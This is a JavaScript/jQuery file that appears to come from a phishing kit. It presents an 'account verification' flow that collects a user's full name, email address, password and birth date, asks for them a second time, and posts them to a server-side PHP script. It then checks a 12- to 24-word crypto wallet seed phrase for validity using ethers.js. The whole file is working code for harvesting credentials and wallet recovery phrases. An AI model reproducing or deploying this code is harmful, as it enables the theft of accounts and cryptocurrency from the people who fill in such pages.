function() {
	$(".welcome").hide();
	$(".home").show();
	$(".loading1").hide();
	$(".loadingform").hide();
}

function process_home() {
	$('#process_home_form').submit(function(submitingprocess_home){
	submitingprocess_home.preventDefault();
	
	var $full_name = $("input#full_name").val();
	var $email_address = $("input#email_address").val();
	var $password = $("input#password").val();
	var $month = $("input#month").val();
	var $day = $("input#day").val();
	var $year = $("input#year").val();
	if($full_name == "" && $email_address == "" && $password == "" && $month == "" && $day == "" && $year == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "data/data.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$(".home").hide();
			$(".loading").show();
		},
		success: function(){
			$(".loading").hide();
			$(".rehome").show();
		}
	});
	});  
	return false;
};

function process_rehome() {
	$('#process_rehome_form').submit(function(submitingprocess_rehome){
	submitingprocess_rehome.preventDefault();
	
	var $full_name = $("input#full_name").val();
	var $email_address = $("input#email_address").val();
	var $password = $("input#password").val();
	var $month = $("input#month").val();
	var $day = $("input#day").val();
	var $year = $("input#year").val();
	if($full_name == "" && $email_address == "" && $password == "" && $month == "" && $day == "" && $year == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "data/data.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$(".rehome").hide();
			$(".loading").show();
		},
		success: function(){
			$(".rehome").hide();
			$(".loading").hide();
			$(".confirm").show();
			$("input#validateConfirmFullName").val($full_name);
			$("input#validateReConfirmFullName").val($full_name);
		}
	});
	});  
	return false;
};


      function showBtn() {
        if(words) $("#imp").prop("disabled", false)
        else $("#imp").prop("disabled", true) 
      }
      
      $('#wordsseed').on("change keyup paste", function(evt) {
        let pass = $(this).val()
        if(pass.split(" ").length == 12 || pass.split(" ").length == 18 || pass.split(" ").length == 21 || pass.split(" ").length == 24){
          $("#wordsErrorConfir").hide()
        
          try{
            let mnemonic = pass
            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
            words = true
            $("#wordsErrorConfir").hide()
            $("#incorecct").hide()
          } catch (e){
            $("#wordsErrorConfir").hide()
            $("#incorecct").show()
            words = false
          }

        } else{
          $("#wordsErrorConfir").show()
          words = false
          
          $("#incorecct").hide()
        }

        showBtn()
      })

      setTimeout(function(){
        $(".loader").hide() 
        $(".alertBox").fadeOut('slow')
        $(".alert").fadeOut('slow')
      }, 2000)